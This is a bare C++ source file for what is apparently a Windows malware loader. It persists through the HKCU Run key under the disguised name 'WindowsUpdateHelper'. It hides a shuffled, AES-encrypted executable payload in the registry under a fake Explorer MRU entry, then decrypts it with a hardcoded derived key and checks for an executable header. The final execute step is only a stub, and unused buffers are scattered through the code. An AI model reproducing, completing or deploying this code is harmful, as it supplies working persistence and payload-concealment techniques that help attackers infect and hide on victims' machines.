#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <cstdio>
#include <random>  
#include <string>
#include <algorithm>
#pragma comment(lib, "advapi32.lib")
#define MAGIC_VALUE     0xCAFEBABE
#define AES_SEED_KEY    ((uint8_t)(MAGIC_VALUE & 0xFF)) 

#pragma pack(push, 1)
struct PIndex {
    uint32_t magic = MAGIC_VALUE;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
    uint16_t shuffle_seed;
};
#pragma pack(pop)
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;


unsigned char* LoadResBID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), "RCDATA");
    if (!hRes) return nullptr;
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;
    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    char buf[256];
    
    if (pbuf.size() != esize) { 
        return false; 
    }
    if (pbuf[0] != 'M' || pbuf[1] != 'Z') { 
        return false; 
    }
    if (CalCR32(pbuf.data(), pbuf.size()) != ecrc) { 
        return false; 
    }
    return true;
}

bool IsInAuto() {
    HKEY hKey;
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        wchar_t regPath[MAX_PATH];
        DWORD size = sizeof(regPath);
        bool found = false;
        
        if (RegQueryValueExW(hKey, L"WindowsUpdateHelper", NULL, NULL, 
                            (LPBYTE)regPath, &size) == ERROR_SUCCESS) {
            found = (wcsstr(regPath, modulePath) != NULL);
        }
        
        RegCloseKey(hKey);
        return found;
    }
    return false;
}

bool AddToAuto() {
    if (IsInAuto()) {
        return true;
    }
    
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        std::wstring value = L"\"" + std::wstring(modulePath) + L"\"";
        BOOL success = (RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
                          (BYTE*)value.c_str(), 
                          (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS);
        
        RegCloseKey(hKey);
        return success;
    }
    return false;
}

bool RegFE() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", 
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    std::wstring iName = L"Explorer.exe";
    DWORD size = 0;
    bool indexExists = (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
    
    RegCloseKey(hKey);
    return indexExists;
}

bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) {
    HKEY hKey;
    DWORD disposition;
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        return false;
    }
    
    std::wstring iName = L"Explorer.exe";
    if (RegSetValueExW(hKey, iName.c_str(), 0, REG_BINARY, 
                   (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    
    for (size_t i = 0; i < eChks.size(); ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY,
                       eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }
    }
    
    RegCloseKey(hKey);
    return true;
}

std::vector<char> LoadFFR() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return {};
    }
    
    std::wstring iName = L"Explorer.exe";
    DWORD size = sizeof(PIndex);
    PIndex index;
    
    if (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {};
    }
    
   if (index.magic != MAGIC_VALUE) {
        RegCloseKey(hKey);
        return {};
    }
    
   
    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.chunk_count);
    for (int i = 0; i < index.chunk_count; ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        DWORD chunkSize = 0;
        
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) == ERROR_SUCCESS) {
            shuffledEncryptedChunks[i].resize(chunkSize);
            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return {};
            }
        } else {
            RegCloseKey(hKey);
            return {};
        }
    }
    
    RegCloseKey(hKey);
    
    if (shuffledEncryptedChunks.size() != index.chunk_count) {
        return {};
    }
    
   
    std::vector<int> chunk_order(index.chunk_count);
    for (int i = 0; i < index.chunk_count; ++i) {
        chunk_order[i] = i;
    }
    
    std::mt19937 rng(index.shuffle_seed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
    char shuffle_info[512];
   
    std::vector<std::vector<BYTE>> eChks(index.chunk_count);
    for (int registry_pos = 0; registry_pos < index.chunk_count; ++registry_pos) {
        int logical_idx = chunk_order[registry_pos];
        
        if (registry_pos < shuffledEncryptedChunks.size()) {
            eChks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
            
            char buf[256];
        } else {
            return {};
        }
    }

    char buf[512];
    std::vector<char> pbuf;
    pbuf.reserve(index.total_size + 1024);

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = AES_SEED_KEY ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};

    for (int i = 0; i < index.chunk_count; ++i) {
        if (i >= eChks.size()) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        const auto& encrypted_data = eChks[i];
        DWORD chunk_size = (DWORD)encrypted_data.size();

       
        BYTE iv[16] = {0};
        if (i > 0) {
            memcpy(iv, last_cipher_block, 16);
        }

        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};

        keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize    = 32;
        memcpy(keyblob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

       
        std::vector<BYTE> decbuf(chunk_size);
        memcpy(decbuf.data(), encrypted_data.data(), chunk_size);
        DWORD out_len = chunk_size;

        if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        CryptDestroyKey(hKey);

        if (chunk_size >= 16) {
            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
        } else {
            memcpy(last_cipher_block, encrypted_data.data(), chunk_size);
            memset(last_cipher_block + chunk_size, 0, 16 - chunk_size);
        }

        if (out_len > 0) {
            BYTE pad = decbuf[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decbuf[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }

        pbuf.insert(pbuf.end(), (char*)decbuf.data(), (char*)decbuf.data() + out_len);
        
    }

    CryptReleaseContext(hProv, 0);

    if (!VerPay(pbuf, index.crc32, index.total_size)) {
        return {};
    }
    return pbuf;
}


std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    DWORD iSize = 0;
    unsigned char* indexData = LoadResBID(999, &iSize);
    if (!indexData || iSize < sizeof(PIndex)) {
        return {};
    }

    PIndex* idx = (PIndex*)indexData;
    if (idx->magic != MAGIC_VALUE) {
        return {};
    }

    std::vector<std::vector<BYTE>> shEChks;
    for (int resource_position = 0; resource_position < idx->chunk_count; ++resource_position) {
        int resId = idx->first_chunk_id + resource_position;
        
        DWORD chunk_size = 0;
        unsigned char* encrypted_data = LoadResBID(resId, &chunk_size);
        
        if (encrypted_data && chunk_size > 0) {
            std::vector<BYTE> chunk(encrypted_data, encrypted_data + chunk_size);
            shEChks.push_back(chunk);
            
            char buf[256];
       
        } else {
            char buf[256];

            return {};
        }
    }

    if (shEChks.size() != idx->chunk_count) {
        return {};
    }
    
    std::vector<int> chunk_order(idx->chunk_count);
    for (int i = 0; i < idx->chunk_count; ++i) {
        chunk_order[i] = i;
    }
    
    std::mt19937 rng(idx->shuffle_seed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
  
    char shuffle_info[512];

    
    std::vector<std::vector<BYTE>> eChks(idx->chunk_count);

for (int r_pos = 0; r_pos < idx->chunk_count; ++r_pos) {
    int logical_idx = chunk_order[r_pos];

    if (r_pos < shEChks.size()) {
       eChks[logical_idx] = std::move(shEChks[r_pos]);

        char buf[256];
    } else {  
        return {};
    }
}

    
    return {*idx, eChks};
}
std::vector<char> RecFWRP() {
    if (!IsInAuto()) {
        AddToAuto();
    }
    
    if (RegFE()) {
      
        auto rPBuf = LoadFFR();
        if (!rPBuf.empty()) {
          
            return rPBuf;
        }
     
    }
    
   
    auto [index, encryptedChunksLogical] = LoadEFR();   
    if (!encryptedChunksLogical.empty()) {
        std::vector<int> chunk_order(index.chunk_count);
        for (int i = 0; i < index.chunk_count; ++i) {
            chunk_order[i] = i;
        }
        
        std::mt19937 rng(index.shuffle_seed);
        std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
        std::vector<int> inverse_order(index.chunk_count);
        for (int registry_pos = 0; registry_pos < index.chunk_count; ++registry_pos) {
            int logical_idx = chunk_order[registry_pos];
            inverse_order[logical_idx] = registry_pos;
        }
        
        std::vector<std::vector<BYTE>> encryptedChunksShuffled(index.chunk_count);
        for (int logical_idx = 0; logical_idx < index.chunk_count; ++logical_idx) {
            int registry_pos = inverse_order[logical_idx];
            encryptedChunksShuffled[registry_pos] = encryptedChunksLogical[logical_idx];
            char buf[256];
        }
        
        StoreFIR(index, encryptedChunksShuffled);
       
        char buf[512];
        std::vector<char> pbuf;
        pbuf.reserve(index.total_size + 1024);

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
          
            return {};
        }

        BYTE aes_key[32] = {0};
        for (int i = 0; i < 32; i++) aes_key[i] = AES_SEED_KEY ^ (i * 0x11);
        BYTE last_cipher_block[16] = {0};

        for (int i = 0; i < index.chunk_count; ++i) {
            const auto& encrypted_data = encryptedChunksLogical[i];
            DWORD chunk_size = (DWORD)encrypted_data.size();
           
            BYTE iv[16] = {0};
            if (i > 0) {
                memcpy(iv, last_cipher_block, 16);
            }

            struct {
                BLOBHEADER hdr;
                DWORD      dwKeySize;
                BYTE       key[32];
            } keyblob = {0};

            keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
            keyblob.hdr.bVersion = CUR_BLOB_VERSION;
            keyblob.hdr.reserved = 0;
            keyblob.hdr.aiKeyAlg = CALG_AES_256;
            keyblob.dwKeySize    = 32;
            memcpy(keyblob.key, aes_key, 32);

            HCRYPTKEY hKey = 0;
            if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
                CryptReleaseContext(hProv, 0);
                return {};
            }

            if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            std::vector<BYTE> decrypted(chunk_size);
            memcpy(decrypted.data(), encrypted_data.data(), chunk_size);
            DWORD out_len = chunk_size;

            if (!CryptDecrypt(hKey, 0, FALSE, 0, decrypted.data(), &out_len)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            CryptDestroyKey(hKey);

            if (chunk_size >= 16) {
                memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
            }

            if (out_len > 0) {
                BYTE pad = decrypted[out_len - 1];
                if (pad >= 1 && pad <= 16) {
                    bool valid = true;
                    for (int j = 0; j < pad; ++j) {
                        if (decrypted[out_len - 1 - j] != pad) {
                            valid = false;
                            break;
                        }
                    }
                    if (valid) {
                        out_len -= pad;
                    }
                }
            }

            pbuf.insert(pbuf.end(), (char*)decrypted.data(), (char*)decrypted.data() + out_len);
        }

        CryptReleaseContext(hProv, 0);

        if (VerPay(pbuf, index.crc32, index.total_size)) {
            return pbuf;
        }
    }
    
    return {};
}

bool Execute(char* pbuf, uint32_t pbufSize) {
   return true;
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
  
    if (!Execute(pbuf.data(), (uint32_t)pbuf.size())) {
        return -1;
    }
    return 0;
}